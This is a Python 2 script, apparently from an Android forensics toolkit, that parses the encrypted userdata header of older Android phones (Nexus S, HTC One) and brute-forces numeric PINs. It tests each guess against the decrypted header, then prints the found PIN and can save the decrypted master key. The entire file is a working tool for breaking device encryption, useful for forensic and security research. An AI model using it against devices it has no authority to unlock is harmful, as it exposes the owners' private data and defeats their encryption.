#!/usr/bin/env python

# Authors: Thomas Cannon <tcannon@viaforensics.com>
#          Seyton Bradford <sbradford@viaforensics.com>
#          Cedric Halbronn <cedric.halbronn@sogeti.com>
# TAGS: Android, Device, Decryption, Crespo, Bruteforce
#
# Parses the header for the encrypted userdata partition
# Decrypts the master key found in the footer using a supplied password
# Bruteforces the pin number using the header 
#
# --
# Revision 0.1 (released by Thomas)
# ------------
# Written for Nexus S (crespo) running Android 4.0.4
# Header is located in file userdata_footer on the efs partition
#
# --
# Revision 0.3 (shipped with Santoku Alpha 0.3)
# ------------
# Added support for more than 4-digit PINs
# Speed improvements
#
# --
# Revision 0.4 (released by Cedric)
# ------------
# Adapted to support HTC One running Android 4.2.2
# Header is located in "extra" partition located in mmcblk0p27
# Note: changed name from bruteforce_stdcrypto.py to bruteforce.py
# -- 
#

from fde import *

def bruteforce_pin(encrypted_partition, encrypted_key, salt, maxdigits):

  # load the header data for testing the password
  #data = open(headerFile, 'rb').read(32)
  #skip: "This is an encrypted device:)"
  fd = open(encrypted_partition, 'rb')
  fd.read(32)
  data = fd.read(32)
  fd.close()

  print 'Trying to Bruteforce Password... please wait'

  # try all possible 4 to maxdigits digit PINs, returns value immediately when found 
  for j in itertools.product(xrange(10),repeat=maxdigits):
    
    # decrypt password
    passwdTry = ''.join(str(elem) for elem in j)
    #print 'Trying: ' + passwdTry 

    # -- In case you prefer printing every 100 
    try: 
      if (int(passwdTry) % 100) == 0:
        print 'Trying passwords from %d to %d' %(int(passwdTry),int(passwdTry)+100)
    except:
      pass
    
    # make the decryption key from the password
    decrypted_key = get_decrypted_key(encrypted_key, salt, passwdTry)
    
    # try to decrypt the frist 32 bytes of the header data (we don't need the iv)
	# We do not use the ESSIV as IV generator
	# Decrypting with the incorrect IV causes the first block of plaintext to be 
	# corrupt but subsequent plaintext blocks will be correct. 
	# http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher-block_chaining_.28CBC.29
    decData = decrypt_data(decrypted_key, "", data)

    # has the test worked?
    if decData[16:32] == "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0":
      return passwdTry, decrypted_key, decData
      
  return None

def do_job(header_file, encrypted_partition, outfile, maxpin_digits):

  assert path.isfile(header_file), "Header file '%s' not found." % header_file
  assert path.isfile(encrypted_partition), "Encrypted partition '%s' not found." % encrypted_partition

  # Parse header
  encrypted_key, salt = parse_header(header_file)

  for n in xrange(4, maxpin_digits+1):
    result = bruteforce_pin(encrypted_partition, encrypted_key, salt, n)
    if result: 
      passwdTry, decrypted_key, decData = result
      print "Decrypted data:"
      hexdump(decData)
      print 'Found PIN!: ' + passwdTry
      if outfile:
        print "Saving decrypted master key to '%s'" % outfile
        open(outfile, 'wb').write(decrypted_key)
      break

  print "Done."

def main():
  parser = argparse.ArgumentParser(description='FDE for Android')

  parser.add_argument('encrypted_partition', help='The first sector of the encrypted /data partition')
  parser.add_argument('header_file', help='The header file containing the encrypted key')
  parser.add_argument('-d', '--maxpin_digits', help='max PIN digits. Default is 4', default=4, type=int)
  parser.add_argument('-o', '--output_keyfile', help='The filename to save the decrypted master key. Default does not save it', default=None)
  args = parser.parse_args()

  header_file = args.header_file
  encrypted_partition = args.encrypted_partition
  outfile = args.output_keyfile
  maxpin_digits = args.maxpin_digits

  do_job(header_file, encrypted_partition, outfile, maxpin_digits)

if __name__ == "__main__":

  main()
